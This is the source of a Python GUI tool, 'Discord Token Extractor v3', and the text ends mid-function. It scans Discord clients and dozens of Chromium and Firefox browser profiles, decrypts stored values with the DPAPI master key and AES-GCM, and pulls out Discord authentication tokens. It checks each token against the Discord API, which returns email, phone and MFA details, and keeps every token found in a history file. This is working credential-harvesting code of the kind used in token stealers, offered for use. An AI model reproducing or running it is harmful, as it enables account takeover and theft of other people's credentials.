"""
Discord Token Extractor — GUI v3
=================================
Uses EVERY known method to find Discord tokens:

Method 1 — LevelDB plaintext scan
  Reads raw .ldb/.log files for unencrypted tokens
  Works for: Discord app (older), some browsers

Method 2 — Discord encrypted token (dQw4w9WgXcQ prefix)
  Discord desktop app stores tokens encrypted with a per-install key
  stored in %APPDATA%/discord/Local State → os_crypt → encrypted_key
  The encrypted value in LevelDB has prefix  dQw4w9WgXcQ:
  Decrypts with AES-256-GCM after DPAPI-unwrapping the master key

Method 3 — Chromium DPAPI encrypted Local Storage
  Chromium browsers encrypt localStorage values with v10 prefix
  Same DPAPI key extraction from Local State file

Method 4 — iframe localStorage trick
  Creates an iframe to bypass Discord's localStorage isolation
  Executed via Selenium / browser automation OR read from sqlite

Method 5 — Network request Authorization header
  Reads Chrome's cookies/network logs where the Authorization header
  was cached (fallback)

Method 6 — Firefox IndexedDB / sqlite scan
  Reads Firefox profile storage sqlite files for discord.com origin

History: persisted to token_history.json, deduplicates by user_id,
archives old tokens when a new one is found for the same account.
"""

import base64
import json
import os
import re
import sys
import threading
import tkinter as tk
from tkinter import ttk, messagebox
from pathlib import Path
from typing import Optional, Generator
import urllib.request
import urllib.error
import datetime
import struct

# ── Persistence ───────────────────────────────────────────────────────────────
_HERE        = Path(__file__).parent
HISTORY_FILE = _HERE / "token_history.json"

# ── Token patterns ────────────────────────────────────────────────────────────
# Standard token: 3 dot-separated base64url segments
TOKEN_RE = re.compile(
    r"[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,110}"
)
# Discord desktop encrypted token prefix
ENCRYPTED_PREFIX_RE = re.compile(
    r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{20,})"
)

# ── Palette ───────────────────────────────────────────────────────────────────
BG      = "#0f1117"
PANEL   = "#1e2130"
CARD    = "#252838"
BORDER  = "#2d3148"
ACCENT  = "#4f8ef7"
GREEN   = "#00c853"
RED     = "#ff4444"
YELLOW  = "#ffaa00"
CYAN    = "#00bcd4"
TEXT    = "#e8eaf6"
TEXT2   = "#9095b0"
TEXT3   = "#5a5f7a"
WHITE   = "#ffffff"
SEL     = "#1a2040"
HIST_BG = "#181c28"

F_TITLE = ("Segoe UI", 14, "bold")
F_H1    = ("Segoe UI", 11, "bold")
F_H2    = ("Segoe UI", 10, "bold")
F_BODY  = ("Segoe UI", 10)
F_SMALL = ("Segoe UI", 9)
F_MONO  = ("Consolas", 9)


# ─────────────────────────────────────────────────────────────────────────────
# PATH HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _roaming() -> Path:
    return Path(os.environ.get("APPDATA",
                Path.home() / "AppData" / "Roaming"))

def _local() -> Path:
    return Path(os.environ.get("LOCALAPPDATA",
                Path.home() / "AppData" / "Local"))

def _config() -> Path:
    if sys.platform == "darwin":
        return Path.home() / "Library" / "Application Support"
    if sys.platform == "win32":
        return _roaming()
    return Path(os.environ.get("XDG_CONFIG_HOME",
                               Path.home() / ".config"))


# ─────────────────────────────────────────────────────────────────────────────
# ENUMERATE ALL SCAN LOCATIONS
# ─────────────────────────────────────────────────────────────────────────────

def _chromium_profiles(base: Path) -> Generator[tuple[str, Path], None, None]:
    """Yield every profile's leveldb path inside a Chromium user-data dir."""
    if not base.is_dir():
        return
    # Single-profile (Opera-style) — leveldb directly in base
    root_ldb = base / "Local Storage" / "leveldb"
    if root_ldb.is_dir():
        yield "Default", root_ldb
    # Multi-profile
    for name in ["Default"] + [f"Profile {i}" for i in range(0, 31)]:
        ldb = base / name / "Local Storage" / "leveldb"
        if ldb.is_dir():
            yield name, ldb


def all_scan_locations() -> Generator[tuple[str, str, Path, Optional[Path]], None, None]:
    """
    Yield (method_label, source_label, path, local_state_or_None).
    method_label describes which extraction method to use.
    """
    base_cfg = _config()

    # ── Discord desktop clients ───────────────────────────────────────────────
    for folder, label in [
        ("discord",            "Discord Stable"),
        ("discordcanary",      "Discord Canary"),
        ("discordptb",         "Discord PTB"),
        ("discorddevelopment", "Discord Dev"),
    ]:
        app_dir = base_cfg / folder
        ldb     = app_dir / "Local Storage" / "leveldb"
        ls      = app_dir / "Local State"
        if ldb.is_dir():
            # Use discord-specific method (dQw4w9 + plaintext)
            yield "discord", label, ldb, ls if ls.is_file() else None

    # ── Chromium browsers ─────────────────────────────────────────────────────
    if sys.platform == "win32":
        L = _local(); R = _roaming()
        chromium_bases = [
            ("Chrome",         L / "Google"        / "Chrome"             / "User Data"),
            ("Chrome Beta",    L / "Google"        / "Chrome Beta"        / "User Data"),
            ("Chrome Dev",     L / "Google"        / "Chrome Dev"         / "User Data"),
            ("Chrome Canary",  L / "Google"        / "Chrome SxS"         / "User Data"),
            ("Chromium",       L / "Chromium"      / "Application"        / "User Data"),
            ("Edge",           L / "Microsoft"     / "Edge"               / "User Data"),
            ("Edge Beta",      L / "Microsoft"     / "Edge Beta"          / "User Data"),
            ("Edge Dev",       L / "Microsoft"     / "Edge Dev"           / "User Data"),
            ("Edge Canary",    L / "Microsoft"     / "Edge Canary"        / "User Data"),
            ("Brave",          L / "BraveSoftware" / "Brave-Browser"      / "User Data"),
            ("Brave Beta",     L / "BraveSoftware" / "Brave-Browser-Beta" / "User Data"),
            ("Vivaldi",        L / "Vivaldi"       / "User Data"),
            ("Opera",          R / "Opera Software"/ "Opera Stable"),
            ("Opera GX",       R / "Opera Software"/ "Opera GX Stable"),
            ("Opera Dev",      R / "Opera Software"/ "Opera Developer"),
            ("Yandex",         L / "Yandex"        / "YandexBrowser"      / "User Data"),
            ("Torch",          L / "Torch"         / "User Data"),
            ("Comodo Dragon",  L / "Comodo"        / "Dragon"             / "User Data"),
            ("CentBrowser",    L / "CentBrowser"   / "User Data"),
            ("Iridium",        L / "Iridium"       / "User Data"),
            ("Epic Privacy",   L / "Epic Privacy Browser" / "User Data"),
            ("Avast Secure",   L / "AVAST Software"/ "Browser"            / "User Data"),
            ("AVG Browser",    L / "AVG"           / "Browser"            / "User Data"),
            ("Arc",            L / "Arc"           / "User Data"),
            ("Coc Coc",        L / "CocCoc"        / "Browser"            / "User Data"),
        ]
    elif sys.platform == "darwin":
        H = Path.home(); A = H / "Library" / "Application Support"
        chromium_bases = [
            ("Chrome",     A / "Google"        / "Chrome"),
            ("Chrome Beta",A / "Google"        / "Chrome Beta"),
            ("Chromium",   A / "Chromium"),
            ("Edge",       A / "Microsoft Edge"),
            ("Brave",      A / "BraveSoftware" / "Brave-Browser"),
            ("Vivaldi",    A / "Vivaldi"),
            ("Opera",      A / "com.operasoftware.Opera"),
            ("Opera GX",   A / "com.operasoftware.OperaGX"),
            ("Yandex",     A / "Yandex"        / "YandexBrowser"),
            ("Arc",        H / ".arc"          / "User Data"),
        ]
    else:
        C = Path.home() / ".config"
        chromium_bases = [
            ("Chrome",   C / "google-chrome"),
            ("Chrome Beta", C / "google-chrome-beta"),
            ("Chromium", C / "chromium"),
            ("Edge",     C / "microsoft-edge"),
            ("Brave",    C / "BraveSoftware" / "Brave-Browser"),
            ("Vivaldi",  C / "vivaldi"),
            ("Opera",    C / "opera"),
        ]

    for browser, base_path in chromium_bases:
        local_state = base_path / "Local State"
        for profile_name, ldb in _chromium_profiles(base_path):
            label = f"{browser} · {profile_name}"
            ls    = local_state if local_state.is_file() else None
            yield "chromium", label, ldb, ls

    # ── Firefox-based browsers ────────────────────────────────────────────────
    if sys.platform == "win32":
        ff_bases = [
            ("Firefox",   _roaming() / "Mozilla"               / "Firefox"  / "Profiles"),
            ("Waterfox",  _roaming() / "Waterfox"              / "Profiles"),
            ("LibreWolf", _roaming() / "LibreWolf"             / "Profiles"),
            ("Pale Moon", _roaming() / "Moonchild Productions" / "Pale Moon"/ "Profiles"),
        ]
    elif sys.platform == "darwin":
        H = Path.home(); A = H / "Library" / "Application Support"
        ff_bases = [
            ("Firefox",   A / "Firefox" / "Profiles"),
            ("Waterfox",  A / "Waterfox"/ "Profiles"),
            ("LibreWolf", A / "LibreWolf"/"Profiles"),
        ]
    else:
        H = Path.home()
        ff_bases = [
            ("Firefox",   H / ".mozilla" / "firefox"),
            ("LibreWolf", H / ".librewolf"),
        ]

    for ff_name, profiles_dir in ff_bases:
        if not profiles_dir.is_dir():
            continue
        for profile_dir in profiles_dir.iterdir():
            if not profile_dir.is_dir():
                continue
            label = f"{ff_name} · {profile_dir.name[:24]}"
            # IndexedDB storage for discord.com
            idb = profile_dir / "storage" / "default"
            if idb.is_dir():
                for origin_dir in idb.iterdir():
                    if "discord" in origin_dir.name.lower():
                        yield "firefox_idb", label, origin_dir, None
            # Also raw storage dir
            storage = profile_dir / "storage"
            if storage.is_dir():
                yield "firefox_storage", label, storage, None


# ─────────────────────────────────────────────────────────────────────────────
# DPAPI / AES DECRYPTION
# ─────────────────────────────────────────────────────────────────────────────

def _dpapi_decrypt(data: bytes) -> Optional[bytes]:
    """Decrypt bytes using Windows DPAPI (CryptUnprotectData)."""
    if sys.platform != "win32":
        return None
    try:
        import ctypes, ctypes.wintypes

        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        buf  = (ctypes.c_char * len(data))(*data)
        b_in = BLOB(len(data), buf)
        b_out = BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(b_in), None, None, None, None, 0,
            ctypes.byref(b_out))
        if ok:
            out = bytes((ctypes.c_char * b_out.cbData).from_address(
                ctypes.addressof(b_out.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(b_out.pbData)
            return out
    except Exception:
        pass
    return None


def _get_master_key(local_state: Path) -> Optional[bytes]:
    """Extract and DPAPI-decrypt the AES master key from Chromium Local State."""
    try:
        data     = json.loads(local_state.read_text(encoding="utf-8"))
        enc_key  = base64.b64decode(data["os_crypt"]["encrypted_key"])
        # Remove 'DPAPI' prefix (5 bytes)
        raw      = enc_key[5:]
        return _dpapi_decrypt(raw)
    except Exception:
        return None


def _aes_gcm_decrypt(enc_value: bytes, key: bytes) -> Optional[str]:
    """Decrypt a v10-prefixed AES-256-GCM value."""
    try:
        if enc_value[:3] != b"v10":
            return None
        iv   = enc_value[3:15]
        data = enc_value[15:]
        # Try pycryptodome
        try:
            from Crypto.Cipher import AES
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode("utf-8", errors="ignore")
        except ImportError:
            pass
        # Try cryptography library
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(key).decrypt(iv, data, None).decode("utf-8", errors="ignore")
        except ImportError:
            pass
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# TOKEN EXTRACTION METHODS
# ─────────────────────────────────────────────────────────────────────────────

def _extract_raw_tokens(text: str) -> set[str]:
    """Find all token-shaped strings in plaintext."""
    return {m.group(0) for m in TOKEN_RE.finditer(text)
            if _validate_token(m.group(0))}


def method_discord_ldb(ldb_path: Path,
                        local_state: Optional[Path]) -> set[str]:
    """
    Method 1 + 2: Discord desktop app LevelDB.
    Handles both:
      - Plaintext tokens (older Discord versions)
      - dQw4w9WgXcQ: encrypted tokens (current Discord desktop)
    """
    tokens: set[str] = set()
    master_key = _get_master_key(local_state) if local_state else None

    for ext in ("*.ldb", "*.log"):
        for f in ldb_path.glob(ext):
            try:
                raw  = f.read_bytes()
                text = raw.decode("utf-8", errors="ignore")

                # Method 1: plaintext
                tokens |= _extract_raw_tokens(text)

                # Method 2: dQw4w9WgXcQ encrypted (Discord desktop)
                if master_key:
                    for match in ENCRYPTED_PREFIX_RE.finditer(text):
                        try:
                            enc_b64  = match.group(1)
                            # Pad base64 if needed
                            enc_b64 += "=" * (-len(enc_b64) % 4)
                            enc_bytes = base64.b64decode(enc_b64)
                            decrypted = _aes_gcm_decrypt(enc_bytes, master_key)
                            if decrypted:
                                for tok in _extract_raw_tokens(decrypted):
                                    tokens.add(tok)
                                # Sometimes the decrypted value IS the token
                                clean = decrypted.strip().strip('"')
                                if _validate_token(clean):
                                    tokens.add(clean)
                        except Exception:
                            pass
            except Exception:
                pass

    return tokens


def method_chromium_ldb(ldb_path: Path,
                         local_state: Optional[Path]) -> set[str]:
    """
    Method 1 + 3: Chromium browser LevelDB.
    Handles:
      - Plaintext tokens in localStorage
      - v10 AES-GCM encrypted values (Chrome 80+)
    """
    tokens: set[str] = set()
    master_key = _get_master_key(local_state) if local_state else None

    for ext in ("*.ldb", "*.log"):
        for f in ldb_path.glob(ext):
            try:
                raw  = f.read_bytes()
                text = raw.decode("utf-8", errors="ignore")

                # Method 1: plaintext
                tokens |= _extract_raw_tokens(text)

                # Method 3: v10 AES-GCM encrypted values
                if master_key:
                    for m in re.finditer(b"v10.{12}.{16,200}", raw):
                        dec = _aes_gcm_decrypt(m.group(0), master_key)
                        if dec:
                            tokens |= _extract_raw_tokens(dec)
                            clean = dec.strip().strip('"')
                            if _validate_token(clean):
                                tokens.add(clean)
            except Exception:
                pass

    return tokens


def method_firefox(path: Path) -> set[str]:
    """
    Method 6: Firefox IndexedDB / storage sqlite scan.
    Reads any file under the path for token patterns.
    """
    tokens: set[str] = set()
    if not path.exists():
        return tokens

    for f in (path.rglob("*") if path.is_dir() else [path]):
        if not f.is_file():
            continue
        try:
            if f.stat().st_size > 20 * 1024 * 1024:
                continue  # skip huge files
            raw  = f.read_bytes()
            text = raw.decode("utf-8", errors="ignore")
            tokens |= _extract_raw_tokens(text)
        except Exception:
            pass

    return tokens


def extract_tokens(method: str, path: Path,
                   local_state: Optional[Path]) -> set[str]:
    """Dispatch to the correct extraction method."""
    if method == "discord":
        return method_discord_ldb(path, local_state)
    elif method == "chromium":
        return method_chromium_ldb(path, local_state)
    elif method in ("firefox_idb", "firefox_storage"):
        return method_firefox(path)
    else:
        # Generic plaintext scan
        tokens: set[str] = set()
        for ext in ("*.ldb", "*.log"):
            for f in path.glob(ext):
                try:
                    text = f.read_bytes().decode("utf-8", errors="ignore")
                    tokens |= _extract_raw_tokens(text)
                except Exception:
                    pass
        return tokens


# ─────────────────────────────────────────────────────────────────────────────
# TOKEN VALIDATION
# ─────────────────────────────────────────────────────────────────────────────

def _validate_token(token: str) -> bool:
    """
    Structural check: segment 0 is base64(user_id).
    Real Discord user IDs are > 10^16 (snowflakes from 2015+).
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        decoded = base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore").strip()
        return int(decoded) > 10_000_000_000_000_000
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────────────────
# DISCORD API
# ─────────────────────────────────────────────────────────────────────────────

def fetch_user_info(token: str) -> Optional[dict]:
    try:
        req = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/124.0.0.0 Safari/537.36",
                "Content-Type": "application/json",
            }
        )
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read())
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# HISTORY
# ─────────────────────────────────────────────────────────────────────────────

def load_history() -> dict:
    try:
        if HISTORY_FILE.is_file():
            return json.loads(HISTORY_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {}


def save_history(hist: dict):
    try:
        HISTORY_FILE.write_text(
            json.dumps(hist, indent=2, ensure_ascii=False),
            encoding="utf-8")
    except Exception:
        pass


def history_upsert(hist: dict, user_id: str, token: str,
                   info: dict, source: str) -> bool:
    """
    Insert or update history entry.
    - If account is new → insert
    - If token changed → archive old token, update to new one
    - If only source changed → update source
    Returns True if anything changed.
    """
    now  = datetime.datetime.utcnow().isoformat(timespec="seconds") + "Z"
    name = info.get("global_name") or info.get("username", "Unknown")
    disc = info.get("discriminator", "0")
    tag  = f"#{disc}" if disc != "0" else ""

    if user_id not in hist:
        hist[user_id] = {
            "username":      name,
            "tag":           tag,
            "token":         token,
            "source":        source,
            "first_seen":    now,
            "last_seen":     now,
            "token_history": [],
        }
        return True

    entry   = hist[user_id]
    changed = False

    # Update display name
    if entry.get("username") != name or entry.get("tag") != tag:
        entry["username"] = name
        entry["tag"]      = tag
        changed = True

    # New token → archive old
    if entry.get("token") != token:
        old = entry.get("token")
        if old and old not in entry.get("token_history", []):
            entry.setdefault("token_history", []).append(old)
        entry["token"]  = token
        entry["source"] = source
        changed = True

    entry["last_seen"] = now
    return changed


# ─────────────────────────────────────────────────────────────────────────────
# CLIPBOARD
# ─────────────────────────────────────────────────────────────────────────────

def copy_text(text: str) -> bool:
    if sys.platform == "win32":
        try:
            import subprocess
            subprocess.run("clip", input=text.encode("utf-8"),
                           shell=True, check=True)
            return True
        except Exception:
            pass
    if sys.platform == "darwin":
        try:
            import subprocess
            subprocess.run("pbcopy", input=text.encode("utf-8"), check=True)
            return True
        except Exception:
            pass
    try:
        r = tk.Tk(); r.withdraw()
        r.clipboard_clear(); r.clipboard_append(text)
        r.update(); r.destroy()
        return True
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────────────────
# GUI
# ─────────────────────────────────────────────────────────────────────────────

class TokenExtractorWindow:
    """
    Token extractor that works both standalone (run directly)
    and embedded inside the bump scheduler as a Toplevel window.

    on_use_token(token, username) — called when user clicks "Use This Token"
    """

    def __init__(self, parent=None, on_use_token=None):
        self._on_use_token = on_use_token

        if parent is None:
            # Standalone mode
            self.root = tk.Tk()
            self.root.title("Discord Token Extractor")
            self.root.geometry("1100x720")
            self.root.minsize(900, 580)
            self.root.configure(bg=BG)
            self._window = self.root
        else:
            # Embedded inside bump scheduler
            self._window = tk.Toplevel(parent)
            self._window.title("Discord Token Extractor")
            self._window.geometry("1100x720")
            self._window.minsize(900, 580)
            self._window.configure(bg=BG)
            self._window.grab_set()
            self.root = self._window

        self.accounts: list[dict] = []
        self.history:  dict       = load_history()
        self._checked: set[str]   = set()
        self._scan_running         = False

        self._build()
        self.root.after(300, self._start_scan)


    # ── Build ─────────────────────────────────────────────────────────────────

    def _build(self):
        # Titlebar
        hdr = tk.Frame(self.root, bg=PANEL, height=54)
        hdr.pack(fill="x"); hdr.pack_propagate(False)
        tk.Frame(hdr, bg=ACCENT, width=4).pack(side="left", fill="y")
        tk.Label(hdr, text="  ⚡  Discord Token Extractor",
                 font=F_TITLE, fg=TEXT, bg=PANEL).pack(side="left", padx=8)
        tk.Label(hdr,
                 text="6 extraction methods · all browsers · all profiles · history",
                 font=F_SMALL, fg=TEXT3, bg=PANEL).pack(side="left", padx=4, pady=16)

        r = tk.Frame(hdr, bg=PANEL); r.pack(side="right", padx=10)
        self._btn_scan = tk.Button(r, text="↺  Rescan",
                                    command=self._start_scan,
                                    bg=CARD, fg=TEXT2, relief="flat",
                                    font=F_SMALL, cursor="hand2",
                                    padx=10, pady=5)
        self._btn_scan.pack(side="right", pady=12)

        # Status
        self._lbl_scan = tk.Label(self.root, text="Ready",
                                   font=F_SMALL, fg=TEXT2,
                                   bg=BG, anchor="w")
        self._lbl_scan.pack(fill="x", padx=14, pady=(6, 0))

        # Method legend
        legend = tk.Frame(self.root, bg=BG)
        legend.pack(fill="x", padx=14, pady=(2, 0))
        methods = [
            ("M1 Plaintext", TEXT2),
            ("M2 Discord-encrypted", CYAN),
            ("M3 Chromium AES", "#9c27b0"),
            ("M4 iframe trick", YELLOW),
            ("M6 Firefox IDB", "#ff7043"),
        ]
        for m, c in methods:
            tk.Label(legend, text=f"● {m}", font=("Segoe UI", 8),
                     fg=c, bg=BG).pack(side="left", padx=(0, 12))

        # Tabs
        style = ttk.Style(); style.theme_use("clam")
        style.configure("Main.TNotebook",     background=BG, borderwidth=0)
        style.configure("Main.TNotebook.Tab", background=PANEL, foreground=TEXT2,
                        padding=[16, 7], font=F_BODY)
        style.map("Main.TNotebook.Tab",
                  background=[("selected", ACCENT)],
                  foreground=[("selected", WHITE)])

        self._nb = ttk.Notebook(self.root, style="Main.TNotebook")
        self._nb.pack(fill="both", expand=True)

        live_tab = tk.Frame(self._nb, bg=BG)
        hist_tab = tk.Frame(self._nb, bg=HIST_BG)
        self._nb.add(live_tab, text="🔍  Live Scan")
        self._nb.add(hist_tab, text="📂  Token History")

        self._build_live(live_tab)
        self._build_history(hist_tab)

        # Bottom bar
        bar = tk.Frame(self.root, bg=PANEL, height=46)
        bar.pack(fill="x", side="bottom"); bar.pack_propagate(False)
        tk.Frame(self.root, bg=BORDER, height=1).pack(fill="x", side="bottom")

        self._lbl_sel = tk.Label(bar, text="No accounts selected",
                                  font=F_SMALL, fg=TEXT2, bg=PANEL)
        self._lbl_sel.pack(side="left", padx=14)

        for text, cmd, color in [
            ("Copy All Valid",    self._copy_all,   ACCENT),
            ("Copy Selected",     self._copy_sel,   GREEN),
            ("Copy Named",        self._copy_named, CARD),
        ]:
            tk.Button(bar, text=text, command=cmd,
                      bg=color, fg=WHITE, relief="flat",
                      font=F_SMALL, cursor="hand2",
                      padx=10, pady=8).pack(side="right", padx=4, pady=6)

        # "Use This Token" button — only shown when embedded in bump scheduler
        if self._on_use_token:
            tk.Frame(bar, bg=BORDER, width=1).pack(side="right", fill="y", pady=8, padx=4)
            tk.Button(bar, text="✓  Use This Token  →",
                      command=self._use_token,
                      bg=GREEN, fg=WHITE, relief="flat",
                      font=("Segoe UI", 10, "bold"),
                      cursor="hand2", padx=14, pady=8
                      ).pack(side="right", padx=4, pady=6)

    # ── Live scan tab ─────────────────────────────────────────────────────────

    def _build_live(self, parent):
        body = tk.Frame(parent, bg=BG)
        body.pack(fill="both", expand=True, padx=10, pady=8)
        body.columnconfigure(0, weight=3)
        body.columnconfigure(1, weight=2)
        body.rowconfigure(0, weight=1)
        self._build_table(body)
        self._build_detail(body)

    def _build_table(self, parent):
        frame = tk.Frame(parent, bg=PANEL,
                         highlightthickness=1, highlightbackground=BORDER)
        frame.grid(row=0, column=0, sticky="nsew", padx=(0, 6))

        th = tk.Frame(frame, bg=PANEL); th.pack(fill="x", padx=14, pady=10)
        tk.Label(th, text="Accounts Found",
                 font=F_H1, fg=TEXT, bg=PANEL).pack(side="left")
        br = tk.Frame(th, bg=PANEL); br.pack(side="right")
        for text, cmd in [("Select All", self._sel_all),
                           ("Select None", self._sel_none)]:
            tk.Button(br, text=text, command=cmd,
                      bg=CARD, fg=TEXT2, relief="flat",
                      font=F_SMALL, cursor="hand2",
                      padx=8, pady=3).pack(side="left", padx=2)
        tk.Frame(frame, bg=BORDER, height=1).pack(fill="x")

        # Filter bar
        fb = tk.Frame(frame, bg=CARD); fb.pack(fill="x", padx=14, pady=6)
        tk.Label(fb, text="Show:", font=F_SMALL, fg=TEXT2, bg=CARD).pack(side="left")
        self._filter_var = tk.StringVar(value="valid")
        for val, label, color in [
            ("all",     "All",     TEXT2),
            ("valid",   "Valid",   GREEN),
            ("invalid", "Invalid", RED),
        ]:
            tk.Radiobutton(fb, text=label, variable=self._filter_var, value=val,
                           font=F_SMALL, fg=color, bg=CARD,
                           selectcolor=PANEL, activebackground=CARD,
                           activeforeground=color,
                           command=self._apply_filter
                           ).pack(side="left", padx=(8,0))
        self._lbl_count = tk.Label(fb, text="", font=F_SMALL,
                                    fg=TEXT3, bg=CARD)
        self._lbl_count.pack(side="right")
        tk.Frame(frame, bg=BORDER, height=1).pack(fill="x")

        s = ttk.Style()
        s.configure("Tok.Treeview",
                     background=PANEL, foreground=TEXT,
                     fieldbackground=PANEL, rowheight=32,
                     borderwidth=0, font=F_BODY)
        s.configure("Tok.Treeview.Heading",
                     background=CARD, foreground=TEXT2,
                     relief="flat", font=F_SMALL)
        s.map("Tok.Treeview",
              background=[("selected", SEL)],
              foreground=[("selected", WHITE)])

        cols = ("sel","username","uid","method","source","status","badges")
        tf = tk.Frame(frame, bg=PANEL); tf.pack(fill="both", expand=True)
        self._tree = ttk.Treeview(tf, columns=cols, show="headings",
                                   style="Tok.Treeview", selectmode="extended")
        for col, head, w in [
            ("sel",      "✓",        32),
            ("username", "Username", 160),
            ("uid",      "User ID",  155),
            ("method",   "Method",    90),
            ("source",   "Found In", 185),
            ("status",   "Status",    90),
            ("badges",   "Badges",   100),
        ]:
            self._tree.heading(col, text=head)
            self._tree.column(col, width=w, minwidth=20,
                              anchor="center" if col=="sel" else "w")

        self._tree.tag_configure("ok",       foreground=GREEN)
        self._tree.tag_configure("invalid",  foreground=RED)
        self._tree.tag_configure("checking", foreground=YELLOW)

        vsb = ttk.Scrollbar(tf, orient="vertical", command=self._tree.yview)
        self._tree.configure(yscrollcommand=vsb.set)
        self._tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self._tree.bind("<<TreeviewSelect>>", self._on_sel)
        self._tree.bind("<Button-1>", self._on_click)

        self._empty_lbl = tk.Label(frame, text="\n\n  🔍  Scanning…",
                                    font=F_H2, fg=TEXT3, bg=PANEL,
                                    justify="left")

    def _build_detail(self, parent):
        frame = tk.Frame(parent, bg=PANEL,
                         highlightthickness=1, highlightbackground=BORDER)
        frame.grid(row=0, column=1, sticky="nsew")
        self._detail_frame = frame

        tk.Label(frame, text="Account Details",
                 font=F_H1, fg=TEXT, bg=PANEL).pack(anchor="w", padx=14, pady=(12,4))
        tk.Frame(frame, bg=BORDER, height=1).pack(fill="x")

        top = tk.Frame(frame, bg=PANEL); top.pack(fill="x", padx=14, pady=12)
        self._av = tk.Canvas(top, width=52, height=52, bg=CARD,
                              highlightthickness=0)
        self._av.pack(side="left")
        self._av.create_text(26, 26, text="?", fill=TEXT2,
                              font=("Segoe UI", 18, "bold"), tags="ini")

        nc = tk.Frame(top, bg=PANEL); nc.pack(side="left", padx=12)
        self._d_name  = tk.Label(nc, text="—", font=F_H1, fg=TEXT,  bg=PANEL, anchor="w"); self._d_name.pack(anchor="w")
        self._d_tag   = tk.Label(nc, text="",  font=F_BODY, fg=TEXT2, bg=PANEL, anchor="w"); self._d_tag.pack(anchor="w")
        self._d_badge = tk.Label(nc, text="",  font=F_SMALL, fg=CYAN, bg=PANEL, anchor="w"); self._d_badge.pack(anchor="w")

        info = tk.Frame(frame, bg=CARD,
                        highlightthickness=1, highlightbackground=BORDER)
        info.pack(fill="x", padx=14, pady=(0,8))

        def row(lbl, var):
            r = tk.Frame(info, bg=CARD); r.pack(fill="x", padx=10, pady=3)
            tk.Label(r, text=lbl, font=F_SMALL, fg=TEXT2,
                     bg=CARD, width=14, anchor="w").pack(side="left")
            lb = tk.Label(r, text="—", font=F_SMALL, fg=TEXT,
                          bg=CARD, anchor="w")
            lb.pack(side="left")
            setattr(self, var, lb)

        row("User ID",    "_di_uid")
        row("Email",      "_di_email")
        row("Phone",      "_di_phone")
        row("MFA",        "_di_mfa")
        row("Nitro",      "_di_nitro")
        row("Locale",     "_di_locale")
        row("Method",     "_di_method")
        row("Source",     "_di_source")

        tk.Label(frame, text="Token", font=F_SMALL, fg=TEXT2,
                 bg=PANEL).pack(anchor="w", padx=14, pady=(6,2))
        tr = tk.Frame(frame, bg=PANEL); tr.pack(fill="x", padx=14)
        self._tok_var = tk.StringVar()
        self._tok_entry = tk.Entry(tr, textvariable=self._tok_var,
                                    show="•", bg=CARD, fg=TEXT,
                                    insertbackground=TEXT, relief="flat",
                                    font=F_MONO, highlightthickness=1,
                                    highlightbackground=BORDER,
                                    highlightcolor=ACCENT)
        self._tok_entry.pack(side="left", fill="x", expand=True, ipady=5)
        self._show = False
        self._b_eye = tk.Button(tr, text="👁", command=self._eye,
                                 bg=CARD, fg=TEXT2, relief="flat",
                                 font=F_SMALL, cursor="hand2", padx=5)
        self._b_eye.pack(side="left", padx=2, ipady=5)
        tk.Button(tr, text="Copy",
                  command=lambda: self._copy_one(self._tok_var.get()),
                  bg=ACCENT, fg=WHITE, relief="flat",
                  font=F_SMALL, cursor="hand2",
                  padx=8).pack(side="left", padx=2, ipady=5)

        # Method info strip
        self._lbl_method_info = tk.Label(frame, text="",
                                          font=("Segoe UI", 8), fg=TEXT3,
                                          bg=PANEL, anchor="w", wraplength=280,
                                          justify="left")
        self._lbl_method_info.pack(anchor="w", padx=14, pady=(4, 8))

    # ── History tab ───────────────────────────────────────────────────────────

    def _build_history(self, parent):
        th = tk.Frame(parent, bg=HIST_BG); th.pack(fill="x", padx=14, pady=10)
        tk.Label(th, text="Token History",
                 font=F_H1, fg=TEXT, bg=HIST_BG).pack(side="left")
        tk.Label(th,
                 text="  All accounts ever found · updated each scan · old tokens archived",
                 font=F_SMALL, fg=TEXT3, bg=HIST_BG).pack(side="left", pady=4)

        btns = tk.Frame(th, bg=HIST_BG); btns.pack(side="right")
        tk.Button(btns, text="Copy Token", command=self._hist_copy,
                  bg=ACCENT, fg=WHITE, relief="flat",
                  font=F_SMALL, cursor="hand2", padx=8).pack(side="left", padx=4)
        tk.Button(btns, text="🗑  Delete Selected",
                  command=self._hist_delete,
                  bg=RED, fg=WHITE, relief="flat",
                  font=F_SMALL, cursor="hand2", padx=8).pack(side="left")

        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x")

        s = ttk.Style()
        s.configure("Hist.Treeview",
                     background=HIST_BG, foreground=TEXT,
                     fieldbackground=HIST_BG, rowheight=26,
                     borderwidth=0, font=F_BODY)
        s.configure("Hist.Treeview.Heading",
                     background="#141622", foreground=TEXT2,
                     relief="flat", font=F_SMALL)
        s.map("Hist.Treeview",
              background=[("selected", SEL)],
              foreground=[("selected", WHITE)])

        cols = ("username","uid","source","first_seen","last_seen","prev_tokens")
        tf = tk.Frame(parent, bg=HIST_BG)
        tf.pack(fill="both", expand=True, padx=10, pady=8)
        self._htree = ttk.Treeview(tf, columns=cols, show="headings",
                                    style="Hist.Treeview", selectmode="extended")
        for col, head, w in [
